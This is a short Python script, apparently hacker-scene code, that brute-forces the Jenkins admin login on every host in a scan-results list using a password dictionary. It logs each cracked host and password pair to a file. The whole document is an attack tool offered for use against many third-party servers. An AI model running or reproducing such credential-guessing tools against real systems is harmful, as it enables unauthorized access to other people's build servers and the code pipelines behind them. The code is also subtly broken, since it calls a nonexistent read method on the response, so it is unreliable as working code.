"""
Bruteforce Jenkins-CLI with Dictionary
Code by SpliTerZ.tw!XX
Greetz fly out to BoToX & MaXtOr
"""
import re
import requests


def bruteforce():
    hostlist = open('sec_results_jenkins.txt','r').read().splitlines()
    dictionary = open('password.txt','r').read().splitlines()
    for host in hostlist:
        for password in dictionary:            
                LoginData = { 'j_username' : 'admin', 'j_password': password }
                s = requests.post(host, data=LoginData).read()
                if re.search('Logout',s):
                    logfile = open('bruted_jenkins.txt','a')
                    logfile.write(host+" admin/"+password+"\n")
                    logfile.close()
                    break
bruteforce()